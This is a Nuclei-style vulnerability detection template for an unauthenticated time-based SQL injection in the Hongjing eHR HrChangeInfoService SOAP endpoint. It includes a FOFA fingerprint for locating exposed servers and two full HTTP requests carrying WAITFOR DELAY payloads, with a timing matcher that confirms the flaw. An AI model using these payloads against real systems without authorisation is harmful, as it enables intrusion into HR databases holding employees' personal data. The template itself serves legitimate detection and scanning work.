id: HongjingeHR-HrChangeInfoService-sql

info:
  name: 宏景eHR HrChangeInfoService SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="HJSOFT-HCM"
    宏景eHR HrChangeInfoService接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: sql injection

http:
  - raw:
      - |
        POST /services/HrChangeInfoService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: application/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
          <soapenv:Header/>
          <soapenv:Body>
            <hr:getChangeUsers>
              <arg0>
              </arg0>
              <arg1>admin';WAITFOR DELAY '0:0:4'--</arg1>
              <arg2>1</arg2>
            </hr:getChangeUsers>
          </soapenv:Body>
        </soapenv:Envelope>

      - |
        POST /services/HrChangeInfoService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: application/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
          <soapenv:Header/>
          <soapenv:Body>
            <hr:getChangeUsers>
              <arg0>
              </arg0>
              <arg1>admin';WAITFOR DELAY '0:0:8'--</arg1>
              <arg2>1</arg2>
            </hr:getChangeUsers>
          </soapenv:Body>
        </soapenv:Envelope>

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code == 200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
